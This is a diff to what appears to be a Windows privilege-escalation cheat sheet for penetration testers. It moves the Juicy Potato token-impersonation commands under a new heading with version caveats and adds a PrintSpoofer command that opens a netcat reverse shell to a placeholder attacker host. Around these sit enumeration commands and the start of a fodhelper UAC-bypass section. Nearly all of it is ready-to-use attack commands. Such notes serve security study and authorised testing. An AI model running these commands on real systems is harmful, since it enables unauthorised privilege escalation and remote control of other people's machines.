@@ -1037,19 +1037,25 @@ net user {USERNAME}
 # Check UAC level
 whoami /groups
 
-# Check Privileges for Impersonation
-whoami /priv
-JuicyPotato.exe -t * -p {run.exe} -l 8003
-JuicyPotato.exe -t * -p {run.exe} -l 8003 -c {CLSID}
-
 # Check File Permissions
 Get-ACL {FILE or DIR} | fl
 icacls {FILE}
 
+# Juicy Potato for Impersonation
+# Juicy Potato does not work for Windows Server 2019 and Windows 10 versions 1809 and higher.
+whoami /priv
+JuicyPotato.exe -t * -p {run.exe} -l 8003
+JuicyPotato.exe -t * -p {run.exe} -l 8003 -c {CLSID}
+
+https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
+
 # Powershell
 cmd /c "JuicyPotato.exe -t * -p run.exe -l 8003 -c {CLSID}"
 
-https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
+# Print Spoofer for Impersonation
+# Compatible for Windows 10 and Server 2016/2019.
+PrintSpoofer.exe -c "nc.exe {LHOST} {LPORT} -e cmd"
+
 
 # UAC BYPASS using Fodhelper.exe or Computer Defaults.exe
 where /r C:\windows fodhelper.exe
